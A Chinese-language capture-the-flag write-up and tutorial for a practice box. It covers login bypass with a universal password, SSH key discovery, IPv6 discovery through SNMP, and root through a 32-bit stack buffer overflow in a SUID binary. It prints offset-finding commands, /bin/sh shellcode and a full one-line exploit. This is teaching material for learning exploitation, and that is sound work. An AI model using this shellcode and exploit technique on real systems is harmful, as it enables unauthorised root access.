本文涉及知识点：

实战

信息收集

 

 

Dev 为登陆页面

 

尝试登陆：

 

没有其他目录

Get User

通过万能密码登陆成功

 

 

发现用户名：thrasivoulos 与私钥，将私钥保存到本地 key_ssh.txt，权限设置为600

 

 

但是之前 nmap 扫描的时候，服务器并没有ssh服务

再扫下 UDP 端口 看是否有其他突破点

发现 UDP端口 161

Snmp

通过snmpwalk 发现更多信息

之前扫描的时候只有80端口 现在通过 snmpwalk 查找 ipv6 地址

1.3.6.1.2.1.4.34.1.3 (ipAddressIfIndex)

 

3.6.1.2.1.4.34.1.3.2.16 为 ipv6 OID的开头

所以 222.173.190.239.0.0.0.0.2.80.86.255.254.185.138.75 是我们需要的

将它转换为 16进制

获得地址：

DEAD:BEEF:0000:0000:0250:56FF:FEB9:8A4B

此处可通过 Enyx 脚本快速查找 ipv6 地址等信息

python enyx.py 2c public 10.10.10.20

再次运行 nmap 扫描

 

找到了 ssh 服务

现在可以通过之前在 dev 登陆后获取的 ssh 私钥进行登陆

ssh -i ssh_key.txt thrasivoulos@DEAD:BEEF:0000:0000:0250:56FF:FEB9:8A4B

 

成功获取 user.txt


Get Root

首先进行枚举

使用 LinEnum

 

 

 

查找到的 SUID文件太少了

find / -perm -4000 -user root -exec ls -ld {} ; 2>/dev/null

使用这个语句再次查询

 

在 /usr/local/bin/ 中发现一个可疑的二进制文件

 

目标系统存在 gdb 通过 gdb分析

 

可以看出 是32位程序 使用了strcpy函数。

为了符合习惯

方便观看

将gdb转换为intel格式的汇编

set disassembly-flavor intel

转回AT&T 使用

set disassembly-flavor att

然后反编译main()函数

disas main

 

通过输入 500 个 a ，测试发现溢出

 

 

判断系统的地址随机化是否开启

sysctl -a --pattern "randomize"

 

0 表示关闭，地址随机化未开启也就是 ASLR 未启用（后面基本上都需要绕过 ASLR 保护）

此处可以通过将文件下载到本地，然后使用 checksec 脚本 检查是否开启了一些常见的保护。

现在是需要确定 EIP 的具体位置，可以使用 Metasploit 的一个组件来确定

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500

使用 pattern_create.rb 生成一串唯一格式的字符串

 

 

溢出在 0x316d4130 位置

现在通过另外一个组件 pattern_offsec 确定位置

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x316d4130 -l 500

 

确定位置为 362

验证一下

生成362个A + 4个B

 

 

验证成功

接下来确定ESP的位置 需要通过ESP指向我们想利用的shellcode

此处我们直接使用dmesg来确定ESP的位置（dmesg用于检查或控制内核环缓冲区。）

一般在gdb测试溢出然后挂载

可直接使用

dmesg | tail -1

dmesg | tail -2

dmesg | tail -3

来看dmesg最后几行的信息

 

确定为 0xbffff510

根据地址从低到高规则：使用的时候为 \x10\xf5\xff\xbf

需要用到的 shellcode

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80

根据前面的信息 最后的POC为：

$(python -c ‘print “A” * 362 + “\x10\xf5\xff\xbf” + “\x90” * 60 + “x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80”’)

 

成功溢出 拿下 Root

 

个人感悟

以上的内容是最简单的缓冲区溢出，思路就是 确定 EIP ，找到 ESP ，然后通过 ESP 跳到我们的 shellcode 代码，让系统执行我们的代码。因为 ASLR、NX 这些常见的防护都没开，所以这个 BOF 的难度是很低的，随着后面的更新，大家会逐渐见到更多的情况，如何去绕过保护。

这是一篇为了配合 Exploit 编写教程而专门打的靶机。因为那个教程太老了，虽然很多思路也用的上，但不是特别方便复现练习，所以自己也写个 跟着靶机 Writeup 学 BOF。在内容上很多地方只是说 我们下一步要怎么做，会附带一些解释，但没有特别详细的解释，详细的解释请查看 我的翻译文章：Exploit 编写教程。

关于更新与集数：暂定 6 集，周更吧。根据实际情况再调整。这是第一季。
